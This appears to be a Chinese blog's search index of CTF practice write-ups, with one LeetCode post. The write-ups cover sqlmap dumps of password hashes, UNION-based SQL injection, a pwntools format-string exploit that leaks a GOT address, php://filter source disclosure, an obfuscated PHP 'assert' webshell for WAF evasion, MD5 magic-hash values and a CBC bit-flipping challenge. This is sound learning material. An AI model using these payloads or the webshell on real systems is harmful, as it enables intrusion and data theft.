<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[两道sql注入题]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%2F</url>
    <content type="text"><![CDATA[基于sql的盲注之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式 可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &quot;post.txt&quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &quot;url&quot; --forms 指定参数 趁机学到了一把sqlmap使用虽然这个题目是有点。。但是注入点的判断也是很重要的 爆后端数据库python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; 爆数据库python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs 指定数据库报表爆表python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables 指定数据库和表爆字段python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns 指定数据库，表，字符然后dump出数据python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump123456789Database: stormgroupTable: member[2 entries]+-------+----------------------------------+--------+| name | password | status |+-------+----------------------------------+--------+| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0 || mozhe | b7a0bebf8287c87253fb2958a390346a | 1 |+-------+----------------------------------+--------+ 解密之后是106370这样就能登陆后台了太神奇了 参考sqlmap之(六)——POST登陆框注入实战 SQL手工注入漏洞测试(Access数据库)这道题目就有点神奇了 纯靠猜 order by 4判断有多少个字段 然后 new_list.asp?id=1 and exists(select * from admin)判断是否存在admin 接下来判断回显位置/new_list.asp?id=1 union select 1,2,3,4 from admin 接下来猜测字段值and exists (select id from admin) 爆出字段值union select 1,username,passwd,id from admin md5解密一下登陆就行了 参考]]></content>
      <categories>
        <category>mozhe</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode 2]]></title>
    <url>%2F2019%2F07%2F15%2FLeetcode-2%2F</url>
    <content type="text"><![CDATA[# 错解 怎么快速地将链表倒置 :confused: 最后还是因为溢出的问题 思路： \123456789101112131415161718192021222324​ int k = 0; ListNode temp1 = l1; ListNode temp2 = l2; double resultl1 = 0; double resultl2 = 0; while (temp1 != null) &#123; int tempvalue = temp1.val; resultl1 = resultl1 + tempvalue * Math.pow(10, k); k++; temp1 = temp1.next; &#125;\ 就是将其转化为整数，因为链表的第一个元素是最低位，之后是十位，百位等 将得到的结果在转化为链表 \12345678910111213141516171819202122 int result = (int) (resultl1 + resultl2); ListNode ans = new ListNode(0); //先取一个头节点 ListNode head = ans; int length = Integer.toString(result).length(); for (int i = 0; i &lt; length; i++) &#123; ListNode temp = new ListNode(result % 10); head.next = temp; head = head.next; result = result / 10; &#125;\ 记录一下将整数转为string的操作 > Integer.toString(result) Math.pow函数的返回值必须是double类型的 但是这样会面临一个问题，也就是最开图片的那个，溢出！ # 正解 看了眼答案，才明白自己从开始就想错了 \12345678910111213141516171819202122232425262728293031323334353637383940public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; int carry = 0; while (p != null || q != null) &#123; int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; &#125; if (carry &gt; 0) &#123; curr.next = new ListNode(carry); &#125; return dummyHead.next;&#125;\ 最关键的就是 ==int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10);== 其实只需要从低位开始一位位的加上去就好了。 然后再把它们给链起来]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串分析]]></title>
    <url>%2F2019%2F05%2F04%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[格式化字符串这个题目是ctfwiki上的 c代码如下： 123456789#include &lt;stdio.h&gt;int main() &#123; char s[100]; int a = 1, b = 0x22222222, c = -1; scanf("%s", s); printf("%08x.%08x.%08x.%s\n", a, b, c, s); printf(s); return 0;&#125; （突然发现腾讯文档居然还支持代码好强啊 我们编译一下： 1gcc -m32 -fno-stack-protector -no-pie -o leakMemory leakMemory.c -g 把保护措施都关掉了 1234567 % checksec leakMemory [*] '/home/abc/Desktop/pwn/leakMemory/leakMemory' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 先看一下几个payload 12345678pwndbg&gt; b printfBreakpoint 1 at 0x8048330pwndbg&gt; rStarting program: /home/abc/Desktop/pwn/leakMemory/leakMemory %08x.%08x.%08xBreakpoint 1, __printf (format=0x8048593 "%08x.%08x.%08x.%s\n") at printf.c:2828printf.c: No such file or directory. 在printf处下断点此时栈上的布局如下 12345600:0000│ esp 0xffffcf9c —▸ 0x80484ea (main+100) ◂— add esp, 0x2001:0004│ 0xffffcfa0 —▸ 0x8048593 ◂— and eax, 0x2e783830 /* '%08x.%08x.%08x.%s\n' */02:0008│ 0xffffcfa4 ◂— 0x103:000c│ 0xffffcfa8 ◂— 0x22222222 ('""""')04:0010│ 0xffffcfac ◂— 0xffffffff05:0014│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x' continue一下： 123456pwndbg&gt; cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08xBreakpoint 1, __printf (format=0xffffcfc0 "%08x.%08x.%08x") at printf.c:2828in printf.c 输出了信息的同时， 命中第二个断点 此时栈上的布局如下： 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x'... ↓03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— '%08x.%08x.%08x'06:0018│ 0xffffcfc4 ◂— '.%08x.%08x'07:001c│ 0xffffcfc8 ◂— 'x.%08x' 此时printf函数会把格式化字符串之后的栈上的信息当作参数打印出来：contiue一下 123pwndbg&gt; cContinuing.ffffcfc0.f7fcf410.0804849d[Inferior 1 (process 4975) exited normally] 之前栈上的信息显示的不全，栈的内存如下： 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x78383025 0x3830252e 0x30252e78 0x000078380xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0x6f984f000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 0xffffcfb0 是格式化字符串的地址， 我们看到此时printf函数将0xffffcfc0 0xf7fcf410 0x0804849d都打印出来了， 也就是格式化字符串之后的三个位置的信息 我们通过这种方式泄露栈的信息，但是也可以直接去取得栈中被视为第n+1个参数的值至于为什么是第n+1, 这是因为格式化字符串是第一个参数 比如 通过 %3\$x(这个的原理是啥？为什么要加\$符号) 我们可以泄露栈上被视为第4个参数的值 栈布局如下：(左边的一列是栈地址，也就是内存的地址，箭头代表了这个内存单元存储的数据，如果是指针还会进一步指示) 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%3$x'... ↓(这里是省略号，是不是就是直接指向了，中间那个就被跳过了)03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— '%3$x'06:0018│ 0xffffcfc4 ◂— 0x007:001c│ 0xffffcfc8 —▸ 0xf7ffd940 ◂— 0x0 同样看不清， 还是直接打印内存信息吧(x命令的用法，这里显示的是内存地址从0xffffcfb0开始的，因为内存是按照字节编址的，所以一行正好是16个字节内存地址就是加10) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d (0xffffcfb0这个内存单元指向了0xffffcfc0)0xffffcfc0:0x78243325 0x00000000 0xf7ffd940 0x000000c2 (看内存单元0xffffcfc0存放的内容就是x$3%)0xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xd6a577000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 猜猜这时候打印的信息是啥？答案是栈上被视为第四个参数的信息： 0x0804849d 同样的我们还可以通过%s来得到字符串的信息 栈布局如下： 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— 0x7325 /* '%s' */... ↓03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— 0x7325 /* '%s' */06:0018│ 0xffffcfc4 ◂— 0x107:001c│ 0xffffcfc8 —▸ 0xf7ffd940 ◂— 0x0 还是看不清，直接看内存吧(md 垃圾pwndbg) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x00007325 0x00000001 0xf7ffd940 0x000000c20xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xf1ae29000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 这个时候会直接将 0xffffcfc0 对应的字符串打印出来结果自然就是 %s了 如果我们输入%2$s, 这个时候就很有趣了， 按照道理程序会将 0xf7fcf410 对应地址的当作字符串打印出来， 可是如果这个地址无效呢？我自己尝试的结果是直接退出了，什么都没有打印出来emm 这时候如果我们指定一个合法的地址， 比如got表中某个函数的地址这就很神奇了 exp如下： 123456789101112131415161718192021222324252627from pwn import *import timesh = process('./leakMemory')context.log_level = 'debug'leakmemory = ELF('./leakMemory')__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']print hex(__isoc99_scanf_got)payload = p32(__isoc99_scanf_got) + '%4$s'print payloadpayload1 = '%4$s' #这两个payload是自己测试的payload2 = 'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'gdb.attach(sh)#time.sleep(1)sh.sendline(payload)sh.recvuntil('%4$s\n')#print sh.recvuntil('%4$s\n')#print '\n'print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@gotsh.interactive() 我们运行这个exp在pwndbg中下断点 运行到第二个printf的时候 123456789───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ esp 0xffa3bdfc —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffa3be00 —▸ 0xffa3be10 —▸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) —▸ 0xf7df2bb0 (__isoc99_scanf) ◂— push ebp... ↓03:000c│ 0xffa3be08 —▸ 0xf7f85410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffa3be0c —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffa3be10 —▸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) —▸ 0xf7df2bb0 (__isoc99_scanf) ◂— push ebp06:0018│ 0xffa3be14 ◂— '%4$s'07:001c│ 0xffa3be18 —▸ 0xf7fb3900 (catch_hook) ◂— 0x0 另一边 123456789[+] Waiting for debugger: Done[DEBUG] Sent 0x9 bytes: 00000000 14 a0 04 08 25 34 24 73 0a │····│%4$s│·│ 00000009[DEBUG] Received 0x24 bytes: 00000000 30 30 30 30 30 30 30 31 2e 32 32 32 32 32 32 32 │0000│0001│.222│2222│ 00000010 32 2e 66 66 66 66 66 66 66 66 2e 14 a0 04 08 25 │2.ff│ffff│ff.·│···%│ 00000020 34 24 73 0a │4$s·││ 00000024 continue 1234567[DEBUG] Received 0x8 bytes: 00000000 14 a0 04 08 b0 2b df f7 │····│·+··││ 000000080xf7df2bb0[*] Switching to interactive mode[*] Process './leakMemory' stopped with exit code 0 (pid 5064)[*] Got EOF while reading in interactive 这个时候我们就得到了scanf函数的地址了ok 还有几个地方没弄明白之后再写 确定可控制格式化字符串位置的方法既然程序是有漏洞的，我们就必须知道可被控制的格式化字符串的位置，这时候大致有以下几种姿势 构造类似 [tag]%p%p%p%p%p%p...这样的参数 Pwngdb中有一个叫做fmarg可以用来获取指定地址到底是第几个参数 不是很理解第一种方法原理，但是第二种方法比较好用 不过我们可以来看一个例子： IDA中的C代码： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+3h] [rbp-3Dh] signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+4h] [rbp-3Ch] char *format; // [rsp+8h] [rbp-38h] _IO_FILE *fp; // [rsp+10h] [rbp-30h] char *v9; // [rsp+18h] [rbp-28h] char v10[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v11; // [rsp+38h] [rbp-8h] v11 = __readfsqword(0x28u); fp = fopen("flag.txt", "r"); for ( i = 0; i &lt;= 21; ++i ) v10[i] = _IO_getc(fp); fclose(fp); v9 = v10; puts("what's the flag"); fflush(_bss_start); format = 0LL; __isoc99_scanf("%ms", &amp;format); for ( j = 0; j &lt;= 21; ++j ) &#123; v4 = format[j]; if ( !v4 || v10[j] != v4 ) &#123; puts("You answered:"); printf(format); puts("\nBut that was totally wrong lol get rekt"); fflush(_bss_start); return 0; &#125; &#125; printf("That's right, the flag is %s\n", v9); fflush(_bss_start); return 0;&#125; 显然的格式化字符串漏洞 我们需要在printf函数处下断点 然后随便输入一些数字: 123456789101112131415161718192021222324[-------------------------------------code-------------------------------------] 0x7ffff7a48e6c &lt;__fprintf+172&gt;: call 0x7ffff7b18c80 &lt;__stack_chk_fail&gt; 0x7ffff7a48e71: nop WORD PTR cs:[rax+rax*1+0x0] 0x7ffff7a48e7b: nop DWORD PTR [rax+rax*1+0x0]=&gt; 0x7ffff7a48e80 &lt;__printf&gt;: sub rsp,0xd8 0x7ffff7a48e87 &lt;__printf+7&gt;: test al,al 0x7ffff7a48e89 &lt;__printf+9&gt;: mov QWORD PTR [rsp+0x28],rsi 0x7ffff7a48e8e &lt;__printf+14&gt;: mov QWORD PTR [rsp+0x30],rdx 0x7ffff7a48e93 &lt;__printf+19&gt;: mov QWORD PTR [rsp+0x38],rcx[------------------------------------stack-------------------------------------]0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;: mov edi,0x4009b8)0008| 0x7fffffffde10 --&gt; 0x61000001 0016| 0x7fffffffde18 --&gt; 0x602cb0 ('a' &lt;repeats 16 times&gt;)0024| 0x7fffffffde20 --&gt; 0x602260 --&gt; 0x0 0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0040| 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0048| 0x7fffffffde38 ("111111111&#125;\n\377\377\377")0056| 0x7fffffffde40 --&gt; 0xffffff0a7d31 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, __printf (format=0x602cb0 'a' &lt;repeats 16 times&gt;) at printf.c:2828 printf.c: No such file or directory. 这时候可以看到flag了，注意我们是在本地调试，调试的时候当然可以看到flag，一般的pwn题都是要远程连接的 如果我们要泄露flag的值，就需要构造%n$s这样的传进去。所以获取参数的位置很关键 12gdb-peda$ fmtarg 0x7fffffffde28The index of format argument : 10 ("\%9$p") 通过Pwngdb就可以查看参数的位置了 这时候运行 12345678abc@ubuntu ~/Desktop/pwnEaxmple/zifuchuan % ./goodluck what's the flag%9$sYou answered:flag&#123;111111111111&#125;���But that was totally wrong lol get rekt 就得到了flag (这里值得注意的就是，64位系统和32位系统传参是不一样的)]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku web题目的wp]]></title>
    <url>%2F2019%2F02%2F07%2Fbugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp%2F</url>
    <content type="text"><![CDATA[welcome to bugkuctf ctrl + U查看页面源代码， 如果有 $user且 file_get_contents($user, &#39;r&#39;) 的 值是 指定的字符串。 就会 include $file 的内容 。 并且提示是 hint.php这个文件 这里涉及到一个怎么把 get 方法传入的参数作为一个文件打开。 php伪协议这里用到了 php://input 但是。。 这就要用到第二个伪协议：php://filter 我那样传递参数会报错， include($file) 只是把 $file 这个变量当作文件名包括进去了。 就是含在源代码里， 不是简单地构造一个参数就能达到的。 这就是一个泄露了源码的漏洞了。 最后构造的URL如下：http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php 惊叹。base64 解密之后的源代码。 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 代码里面构造了一个类。公有变量是 $file 继续看一下 index.php 的源代码 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "ä¸è½ç°å¨å°±ç»ä½ flagå¦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 有几个地方暂时写不到位， 先到这里好了。 过狗一句话很蒙 1234&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 上面是题目提示的过狗一句话代码。然后…后面的不会了 字符，正则？ 前女友一道很有趣的题目， 就不说题目了， 直接放我的测试代码 123456789101112131415161718192021&lt;?phperror_reporting(0);if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; echo "$v1&lt;/br&gt;"; var_dump($v1); echo "&lt;/br&gt;"; echo md5($v1)."&lt;/br&gt;"; echo "$v2&lt;/br&gt;"; echo md5($v2)."&lt;/br&gt;"; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; echo "true"; &#125; else &#123; echo "false"; &#125;&#125;?&gt; 也是第一次发现get还能传递数组（不过当然是一堆的错误） MD5 collision还不太清楚MD5 碰撞是啥， 以后补坑 payload120.24.86.145:9009/md5.php?a=s878926199a 常用的MD5碰撞123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 秋名山老司机123456789101112&lt;head&gt;&lt;title&gt;下面的表达式的值是秋名山的车速&lt;/title&gt;&lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;p&gt;亲请在2s内计算老司机的车速是多少&lt;/p&gt;&lt;div&gt;1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;&lt;/div&gt;&lt;style&gt;div,p&#123;text-align: center;margin: 0 auto;&#125;&lt;/style&gt; 两秒之内计算出式子中的值， 再提交 菜鸡还不太会写脚本参考了dalao们的代码 123456789import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()source = s.get(url)expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()result = eval(expression)post = &#123;'value': result&#125;print(s.post(url, data = post).text) 不过还是没搞出来。 复习一下requests库 1234567import requests#构造requests对象s = requests.get(url)s.post(url, )#差不多就这些了 cookies欺骗 然而注意到URL中的line和file时就能做出来了。 1234567#用脚本把代码跑出来import requestsa=30for i in range(a): url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print s.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //看这里 $file_list[2]='keys.php'; &#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125; ?&gt; 构造cookie就行啦（然而没搞出flag来） login4CBC字节翻转攻击放一张经典的图 据师傅们的wp说是有一个index.php.swp文件存在。然而没找到， 先把师傅们找到的源码放上来 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; info = array('username'=&gt;username,'password'=&gt;password); login(info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class="login-body"&gt; &lt;div id="wrapper"&gt; &lt;div class="user-icon"&gt;&lt;/div&gt; &lt;div class="pass-icon"&gt;&lt;/div&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt; &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;input type="submit" name="submit" value="Login" class="button" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; 备份是个好习惯根据以前做题的经验， 备份就是在提示你 存在bak文件所以直接输入URL为 http://123.206.87.240:8002/web16/index.php.bak 然后下载文件代码： 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 做代码审计的题目， 还是主要靠自己尝试。 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);$str = strstr($_SERVER['REQUEST_URI'], '?');echo "$str"."&lt;/br&gt;";$str = substr($str, 1);echo "$str"."&lt;/br&gt;";$str = str_replace('key','', $str);echo "$str"."&lt;/br&gt;";parse_str($str);echo "$key1"."&lt;/br&gt;";echo md5($key1);echo "&lt;/br&gt;";echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) echo 'flag';?&gt; 上面是我用来测试的代码 构造URL为 http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2输出了这些：123456?kkeyey1=1&amp;kkeyey2=2kkeyey1=1&amp;kkeyey2=2key1=1&amp;key2=21c4ca4238a0b923820dcc509a6f75849bc81e728d9d4c2f636f067f89cc14862c 之前还很疑惑为什么没有get都能得到变量， 原来是parse_str这个函数在起作用。 OK， 现在就是表演的时间了。 参考资料https://blog.csdn.net/wy_97/article/details/77431111https://www.cnblogs.com/Pinging/p/8278168.htmlhttps://blog.csdn.net/qq_19861715/article/details/79384018 https://blog.csdn.net/qq_39629343/article/details/80696263 秋名山老司机cookie欺骗CBC字节翻转攻击 python requests库学习]]></content>
      <categories>
        <category>bugkuctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
